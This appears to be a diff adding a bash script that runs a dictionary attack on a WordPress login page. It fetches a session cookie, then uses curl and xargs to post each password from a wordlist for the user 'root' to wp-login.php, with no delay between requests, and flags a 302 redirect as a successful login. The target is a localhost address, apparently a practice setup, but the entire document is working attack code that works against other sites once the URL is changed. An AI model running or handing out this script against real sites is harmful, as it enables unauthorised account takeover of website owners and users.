@@ -1,0 +1,62 @@
+#!/bin/bash
+
+# USAGE: curl-connect [path/to/dictionary.txt]
+
+
+# global variables
+DICTIONARY=$@
+URL='http://localhost:7888/wordpress/wp-login.php'
+TIME_BETWEEN_REQUESTS=0 # time in seconds
+
+# set user name
+USER_NAME='root'
+
+echo
+echo
+
+# Write the received protocol headers to the specified file.
+# Redirect html output to null l
+echo Recieving headers.. 
+curl -s --cookie-jar cookie-info.txt $URL > /dev/null
+
+# Output infos
+echo URL: $URL
+echo Dictionnary: $DICTIONARY
+echo
+
+# define when to stop
+function get_redirection() {
+while read output; do
+			a=$(grep HTTP | cut -d H -f 2 | grep '[0-9]\{3\}' | cut -d " " -f 2)
+   			for data in $a; 
+			do 
+				echo -ne "     "\\r
+				if [[ "$data" == "302"  ]];
+				then
+					echo -e \\n"Redirection found!"
+				else 
+					echo -ne "         "\\r
+				fi				
+			done
+	done
+}
+export -f get_redirection 
+# Open dictionary & redirect error to null
+awk '// {print}' $DICTIONARY  2> /dev/null | \
+	
+		# Post data from dictionary
+		# curl send header response to stdouto --trace -
+		# redirect header response to awk 
+		# identify % as each line of dictionary
+
+			xargs -I % bash -c "\
+			   echo -n Password\:  % '      '; \
+			   curl -s --cookie cookie-info.txt \
+			   -d 'log=root&pwd=%&testcookie=1&rememberme=forever' \
+			   -L http://localhost:7888/wordpress/wp-login.php --trace - \
+			   | get_redirection ; \
+			   sleep $TIME_BETWEEN_REQUESTS; \
+				   " 
+echo
+echo
+
